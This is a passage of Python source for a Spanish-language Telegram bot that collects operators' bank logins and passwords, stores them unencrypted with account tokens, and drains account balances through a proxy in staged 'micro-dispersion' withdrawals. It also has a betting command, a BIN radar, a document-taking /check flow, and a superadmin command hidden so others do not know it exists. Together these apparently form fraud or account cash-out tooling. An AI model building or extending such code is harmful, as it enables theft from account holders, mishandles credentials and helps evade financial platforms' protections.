                "VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
                (
                    email,
                    account_id,
                    user_id,
                    nickname,
                    bank_name,
                    bank_digits,
                    phone,
                    acc_email,
                    username,
                    password,
                    text,
                    now_iso,
                    now_iso,
                ),
            )
    except Exception as ex_save:
        logger.warning(f"[Bot] Error guardando account_withdrawal_access: {ex_save}")

    context.user_data.pop("pending_bank_access", None)
    context.user_data["pending_withdrawal"] = {
        "account_id": account_id,
        "email": email,
        "bank_name": bank_name,
        "account_digits": bank_digits,
    }

    kb = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    "🚀 Iniciar Retiro Automático",
                    callback_data=f"confirm_auto_withdrawal_{account_id}",
                )
            ],
            [
                InlineKeyboardButton(
                    "🏠 Volver al inicio",
                    callback_data="btn_start_cancel",
                )
            ],
        ]
    )

    await update.message.reply_text(
        f"{HEADER}\n\n"
        f"✅ <b>ACCESOS GUARDADOS CORRECTAMENTE</b>\n\n"
        f"• Banco: <b>{bank_name}</b> (<code>••••{bank_digits}</code>)\n"
        f"• Datos asociados al operador: <b>{nickname}</b>\n\n"
        f"¿Deseas iniciar el retiro automático por fases?",
        parse_mode="HTML",
        reply_markup=kb,
    )


async def handle_confirm_auto_withdrawal_callback(
    update: Update, context: ContextTypes.DEFAULT_TYPE
):
    """Dispara la ejecución del retiro automático en segundo plano con telemetría visual in-bot."""
    query = update.callback_query
    await query.answer()
    operator_id = update.effective_user.id
    account_id = int(query.data.replace("confirm_auto_withdrawal_", "").strip())

    jwt, email, _ = _load_jwt_for_account(DB_PATH, account_id)
    proxy_url = _get_admin_proxy_url()

    # Saldo Real inicial
    try:
        bal_data = await get_real_balance(jwt, proxy_url)
        real_balance = float(bal_data.get("Real", 0) or 0)
    except Exception:
        real_balance = 0.0

    if real_balance <= 0:
        await _edit_msg(
            query,
            f"{HEADER}\n\n"
            f"ℹ️ <b>Sin saldo para retirar</b>\n\n"
            f"La cuenta <code>{email}</code> no tiene saldo Real disponible para retiro.",
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("🏠 Volver al inicio", callback_data="btn_start_cancel")]]
            ),
        )
        return

    _pending_spei_fundings.pop(operator_id, None)

    _active_operator_withdrawals[operator_id] = {
        "account_id": account_id,
        "email": email,
        "pct": 10,
        "withdrawn": 0.0,
        "total": real_balance,
        "withdrawal_id": f"wd_{account_id}_{int(time.time())}",
    }

    status_msg = await query.edit_message_text(
        f"{HEADER}\n\n"
        f"💸 <b>RETIRO AUTOMÁTICO INICIADO</b>\n\n"
        f"• 👤 Cuenta: <code>{email}</code>\n"
        f"• 📊 Avance: <code>[{_ascii_bar(10)}] 10%</code>\n"
        f"• 💰 Retirado: <b>$0.00</b> / ${real_balance:,.2f}\n"
        f"• ⚡ Estado: Preparando micro-dispersión segura…\n\n"
        f"📡 <i>Procesando en segundo plano…</i>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("🔄 Actualizar Vista", callback_data="btn_start_active_process")],
                [InlineKeyboardButton("🏠 Volver al inicio", callback_data="btn_start_cancel")],
            ]
        ),
    )

    loop = asyncio.get_running_loop()

    def on_wd_progress(withdrawn: float, batches_count: int, latest_res: dict):
        pct = min(95, int((withdrawn / max(real_balance, 1.0)) * 100))
        _active_operator_withdrawals[operator_id]["pct"] = pct
        _active_operator_withdrawals[operator_id]["withdrawn"] = withdrawn

        bar = _ascii_bar(pct)

        text = (
            f"{HEADER}\n\n"
            f"💸 <b>RETIRO AUTOMÁTICO EN CURSO</b>\n\n"
            f"• 👤 Cuenta: <code>{email}</code>\n"
            f"• 📊 Avance: <code>[{bar}] {pct}%</code>\n"
            f"• 💰 Retirado: <b>${withdrawn:,.2f}</b> / ${real_balance:,.2f}\n"
            f"• ⚡ Estado: Dispersión en marcha ({batches_count} fases procesadas)\n\n"
            f"🇲🇽 <i>Puedes volver al menú principal sin interrumpir la operación.</i>"
        )
        kb = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("🔄 Actualizar Vista", callback_data="btn_start_active_process")],
                [InlineKeyboardButton("🏠 Volver al inicio", callback_data="btn_start_cancel")],
            ]
        )

        async def _edit():
            try:
                await status_msg.edit_text(text, parse_mode="HTML", reply_markup=kb)
            except Exception:
                pass

        asyncio.run_coroutine_threadsafe(_edit(), loop)

    async def _run_withdrawal_background():
        try:
            res = await execute_auto_batch_withdrawal(
                DB_PATH,
                account_id,
                operator_id,
                on_progress=on_wd_progress,
            )
            _active_operator_withdrawals.pop(operator_id, None)

            if res.get("ok"):
                total_w = res.get("total_withdrawn", real_balance)
                await status_msg.edit_text(
                    f"{HEADER}\n\n"
                    f"🎉 <b>¡RETIRO AUTOMÁTICO COMPLETADO!</b>\n\n"
                    f"• 👤 Cuenta: <code>{email}</code>\n"
                    f"• 💰 Total transferido a tu banco: <b>${total_w:,.2f} MXN</b>\n"
                    f"• 📊 Avance: <code>[{_ascii_bar(100)}] 100%</code>",
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup(
                        [[InlineKeyboardButton("🏠 Volver al inicio", callback_data="btn_start_cancel")]]
                    ),
                )
            else:
                reason = res.get("error") or res.get("reason") or "Detenido por protección"
                await status_msg.edit_text(
                    f"{HEADER}\n\n"
                    f"🛑 <b>RETIRO PAUSADO / FINALIZADO</b>\n\n"
                    f"• 👤 Cuenta: <code>{email}</code>\n"
                    f"• 💰 Retirado acumulado: <b>${res.get('total_withdrawn', 0.0):,.2f} MXN</b>\n"
                    f"• ⚠️ Motivo: {reason}\n\n"
                    f"<i>Revisa el estado en tu banca o comunícate con soporte.</i>",
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup(
                        [[InlineKeyboardButton("🏠 Volver al inicio", callback_data="btn_start_cancel")]]
                    ),
                )
        except Exception as ex_wd:
            _active_operator_withdrawals.pop(operator_id, None)
            logger.exception(f"[Bot] Error en retiro automático background: {ex_wd}")
            try:
                await status_msg.edit_text(
                    f"{HEADER}\n\n"
                    f"❌ <b>Error durante el retiro automático:</b>\n<code>{ex_wd}</code>",
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup(
                        [[InlineKeyboardButton("🏠 Volver al inicio", callback_data="btn_start_cancel")]]
                    ),
                )
            except Exception:
                pass

    asyncio.create_task(_run_withdrawal_background())


async def setup_bot_commands(application):
    """Registra el menú nativo de comandos en la interfaz de Telegram.

    /adduser es operativo exclusivo del Superadmin: no se publica en el menú
    general (ni en /help) y solo se expone vía BotCommandScopeChat en el chat
    del Superadmin — nadie más lo ve ni sabe que existe.

    OJO: BotCommandScopeChat REEMPLAZA el scope default para ese chat (no se
    fusiona), así que el scope del SA debe llevar TODOS los comandos.
    """
    commands = [
        BotCommand("start", "🚀 Menú principal"),
        BotCommand("help", "📖 Manual operativo"),
        BotCommand("cancel", "🛑 Cancelar proceso"),
    ]
    try:
        await application.bot.set_my_commands(commands)
        await application.bot.set_my_commands(
            commands + [BotCommand("adduser", "👤 Agregar usuario")],
            scope=BotCommandScopeChat(chat_id=SUPERADMIN_ID),
        )
        logger.info(
            "[Bot] Menú nativo de comandos en Telegram configurado exitosamente."
        )
    except Exception as ex:
        logger.warning(f"[Bot] No se pudo registrar menú nativo de comandos: {ex}")

    # Enviar mensaje startup exclusivo al SuperAdmin (Robert)
    startup_msg = (
        f"{HEADER}\n\n⚡ <b>Telegram Bot Online</b>\n\nSistema listo. A darle..."
    )
    try:
        await application.bot.send_message(
            chat_id=SUPERADMIN_ID, text=startup_msg, parse_mode="HTML"
        )
        logger.info(
            f"[Bot] Notificación de arranque enviada exclusivamente a SuperAdmin ({SUPERADMIN_ID})."
        )
    except Exception as ex:
        logger.warning(
            f"[Bot] No se pudo enviar notificación de arranque a SuperAdmin: {ex}"
        )


async def global_error_handler(
    update: object, context: ContextTypes.DEFAULT_TYPE
) -> None:
    """Manejo centralizado de errores para evitar unhandled exceptions en el bot loop."""
    err = context.error
    if isinstance(err, (NetworkError, TimedOut)):
        logger.warning(f"[Bot Network] Error temporal de conexión: {err}")
    elif isinstance(err, Conflict):
        logger.error(
            f"[Bot Conflict] Conflicto de instancia: otro bot está usando el token {MOCK_BOT_TOKEN[:10]}..."
        )
    else:
        logger.error(
            f"[Bot Error] Excepción no controlada en handler: {err}", exc_info=err
        )


def build_app():
    """Construye la aplicación python-telegram-bot con resiliencia de red."""
    req_config = HTTPXRequest(
        connect_timeout=15.0,
        read_timeout=30.0,
        write_timeout=15.0,
        pool_timeout=15.0,
        connection_pool_size=10,
    )
    app = (
        ApplicationBuilder()
        .token(MOCK_BOT_TOKEN)
        .request(req_config)
        .post_init(setup_bot_commands)
        .build()
    )

    app.add_error_handler(global_error_handler)

    # Handlers directos
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("botmex", botmex_cmd))
    app.add_handler(CommandHandler("cancel", cancel_cmd))

    # Handler callback para botones standalone del /start (help, cancel, radar, stats, active_process)
    app.add_handler(
        CallbackQueryHandler(
            start_buttons_callback,
            pattern="^btn_start_(help|cancel|bin_radar|operator_stats|active_process)$",
        )
    )

    # Handler callback independiente para detener misión iniciada
    app.add_handler(
        CallbackQueryHandler(handle_stop_mission_callback, pattern="^stop_mission_")
    )
    app.add_handler(
        CallbackQueryHandler(
            handle_retry_mission_callback, pattern="^retry_mission_"
        )
    )
    app.add_handler(
        CallbackQueryHandler(
            handle_confirm_gate_callback, pattern="^(confirm_sched_|stop_sched_)"
        )
    )

    # Handlers para verificación de SPEI y confirmación/edición de retiro in-bot
    app.add_handler(
        CallbackQueryHandler(handle_verify_spei_callback, pattern="^verify_spei_")
    )
    app.add_handler(
        CallbackQueryHandler(handle_edit_bank_access_callback, pattern="^edit_bank_access_")
    )
    app.add_handler(
        CallbackQueryHandler(handle_confirm_auto_withdrawal_callback, pattern="^confirm_auto_withdrawal_")
    )

    # ConversationHandler para /check
    check_handler = ConversationHandler(
        entry_points=[
            CommandHandler("check", check_cmd),
            CallbackQueryHandler(start_buttons_callback, pattern="^btn_start_check$"),
        ],
        states={
            WAIT_CHECK_CONFIRM: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, process_check_input),
                MessageHandler(filters.Document.ALL, process_check_input),
                CallbackQueryHandler(
                    handle_check_callback, pattern="^(confirm_check|cancel_check)$"
                ),
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel_cmd)],
    )
    app.add_handler(check_handler)

    # ConversationHandler para /adduser
    adduser_handler = ConversationHandler(
        entry_points=[
            CommandHandler("adduser", adduser_cmd),
            CommandHandler("agregar_usuario", adduser_cmd),
        ],
        states={
            WAIT_ADDUSER_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, process_adduser_input),
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel_cmd)],
    )
    app.add_handler(adduser_handler)

    # ConversationHandler para /bet
    bet_handler = ConversationHandler(
        entry_points=[
            CommandHandler("bet", bet_cmd),
            CallbackQueryHandler(start_buttons_callback, pattern="^btn_start_bet$"),
        ],
        states={
            WAIT_BET_CONFIRM: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, process_bet_input),
                CallbackQueryHandler(
                    handle_bet_callback, pattern="^(confirm_bet|cancel_bet)$"
                ),
                CallbackQueryHandler(
                    start_buttons_callback, pattern="^btn_start_bin_radar$"
                ),
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel_cmd)],
    )
    app.add_handler(bet_handler)

    # Handler para captura de accesos bancarios de retiro (solo procesa si no está en un ConversationHandler)
    app.add_handler(
        MessageHandler(
            filters.TEXT & ~filters.COMMAND,
            process_bank_access_input,
        )
    )

    return app


if __name__ == "__main__":
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8")
    print(f"[BOT MOCK] Iniciando Telegram Bot Mock con Token: {MOCK_BOT_TOKEN[:10]}...")
    print(f"[BOT MOCK] Base de Datos configurada: {DB_PATH}")
    app = build_app()
    app.run_polling(bootstrap_retries=-1, poll_interval=1.0)
